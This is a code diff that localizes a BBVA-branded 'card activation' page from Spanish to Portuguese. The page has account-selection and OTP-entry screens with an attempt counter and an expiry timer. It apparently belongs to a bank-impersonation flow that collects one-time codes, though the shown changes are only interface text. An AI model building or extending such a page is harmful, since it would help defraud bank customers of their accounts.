+                    <span>{language === "en" ? "PROCESSING..." : "A PROCESSAR..."}</span>
                   </div>
                 ) : accountsSuccess ? (
-                  language === "es" ? "✓ Completado" : "✓ Completed"
-                ) : language === "es" ? (
-                  "Continuar"
-                ) : (
+                  language === "en" ? "✓ Completed" : "✓ Concluído"
+                ) : language === "en" ? (
                   "Continue"
+                ) : (
+                  "Continuar"
                 )}
               </button>
             )}
@@ -2047,9 +2158,11 @@ export default function BbvaPage(props: any) {
       {/* ========================================================================= */}
       {currentScreen === "confirm-otp" && (
         <main className="relative w-full max-w-[440px] sm:max-w-[460px] h-[100dvh] max-h-[100dvh] flex flex-col overflow-hidden shadow-2xl bg-white px-0">
-          {/* Header Bar: < CARD ACTIVATION X + 4-segment Progress Bar */}
+          {/* Header Bar: < CARD ACTIVATION [PT|EN] X + 4-segment Progress Bar */}
           <CardActivationHeader
             step={4}
+            language={language}
+            onToggleLanguage={handleLanguageChange}
             onBack={() => {
               setCurrentScreen("accounts")
               if (typeof window !== "undefined" && window.history) {
@@ -2075,14 +2188,14 @@ export default function BbvaPage(props: any) {
 
               {/* Heading */}
               <h2 className="text-[17.5px] sm:text-[18.5px] font-bold text-[#0f172a] text-center mb-1.5">
-                {language === "es" ? "Confirmar transacción" : "Confirm transaction"}
+                {language === "en" ? "Confirm transaction" : "Confirmar transação"}
               </h2>
 
               {/* Subtitle */}
               <p className="text-[11.5px] text-[#64748b] text-center leading-relaxed mb-4 max-w-[270px]">
-                {language === "es"
-                  ? "Introduzca el código de 6 dígitos enviado a su número móvil para autorizar esta acción."
-                  : "Enter the 6-digit code sent to your mobile number to authorise this action."}
+                {language === "en"
+                  ? "Enter the 6-digit code sent to your mobile number to authorise this action."
+                  : "Introduza o código de 6 dígitos enviado para o seu telemóvel para autorizar esta ação."}
               </p>
 
               {/* 6 OTP Boxes */}
@@ -2133,21 +2246,21 @@ export default function BbvaPage(props: any) {
                     <line x1="12" y1="8" x2="12.01" y2="8" />
                   </svg>
                   <span>
-                    {language === "es"
-                      ? "Código incorrecto. Por favor, inténtelo de nuevo."
-                      : confirmErrorMessage}
+                    {language === "en"
+                      ? confirmErrorMessage
+                      : "Código incorreto. Por favor, tente novamente."}
                   </span>
                 </div>
               )}
 
               {/* Attempt Counter: Attempt 1 / 3 */}
               <p className="text-[11px] font-medium text-[#64748b] text-center mb-1">
-                {language === "es" ? "Intento" : "Attempt"} {confirmAttempt} / 3
+                {language === "en" ? "Attempt" : "Tentativa"} {confirmAttempt} / 3
               </p>
 
               {/* Countdown Timer: Code expires in 2:58 */}
               <p className="text-[11.5px] text-[#475569] text-center mb-2 font-medium">
-                {language === "es" ? "El código caduca en " : "Code expires in "}
+                {language === "en" ? "Code expires in " : "O código expira em "}
                 <span className="font-bold text-[#0f172a]">{formatTimer(confirmTimeLeft)}</span>
               </p>
 
@@ -2158,7 +2271,7 @@ export default function BbvaPage(props: any) {
                 className="flex items-center justify-center gap-1.5 text-[11.5px] text-[#64748b] hover:text-[#990440] transition-colors cursor-pointer font-medium mb-4"
               >
                 <RotateCw className="w-3 h-3 stroke-[2.2]" />
-                <span>{language === "es" ? "Reenviar código" : "Resend code"}</span>
+                <span>{language === "en" ? "Resend code" : "Reenviar código"}</span>
               </button>
 
               {/* Confirm Button */}
@@ -2194,12 +2307,12 @@ export default function BbvaPage(props: any) {
                         d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                       />
                     </svg>
-                    <span>{language === "es" ? "CONFIRMANDO..." : "CONFIRMING..."}</span>
+                    <span>{language === "en" ? "CONFIRMING..." : "A CONFIRMAR..."}</span>
                   </div>
-                ) : language === "es" ? (
-                  "Confirmar"
-                ) : (
+                ) : language === "en" ? (
                   "Confirm"
+                ) : (
+                  "Confirmar"
                 )}
               </button>
             </div>
